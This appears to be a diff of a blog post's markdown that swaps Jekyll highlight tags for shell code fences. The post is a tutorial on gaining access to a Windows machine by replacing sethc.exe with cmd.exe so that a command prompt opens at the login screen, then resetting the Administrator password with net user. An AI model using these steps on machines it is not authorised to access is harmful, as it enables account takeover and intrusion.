@@ -17,10 +17,10 @@ step 4)navigate to the windows drive u wanna hack
 lets say in my case D:
 step 5)go to D://Windows/System32/
 
-{% highlight ruby %}
+```sh
 D:
 cd Windows/System32
-{% endhighlight %}
+```
 
 There’s one file named sethc.exe which is responsible to open the dialog box of
 stickey at time of windows login screen, what we are going to do is rename
@@ -28,10 +28,10 @@ our cmd.exe(command prompt) with sethc.exe.
 this is will execute sethc.exe file which is nothing but our command prompt
 because of we rename it with sethc.exe
 
-{% highlight ruby %}
+```sh
 ren sethc.exe sethc.exe.bak
 ren cmd.exe sethc.exe
-{% endhighlight %}
+```
 
 
 there we go.
@@ -42,15 +42,15 @@ it will open command prompt for you.
 
 step 6)Now time to reset the password of windows user
 
-{% highlight ruby %}
+```sh
 net user
-{% endhighlight %}
+```
 
 this command will show all the windows users list.
 
-{% highlight ruby %}
+```sh
 net user Administrator *
-{% endhighlight %}
+```
 
 this will prompt you for new password for Administrator.
 
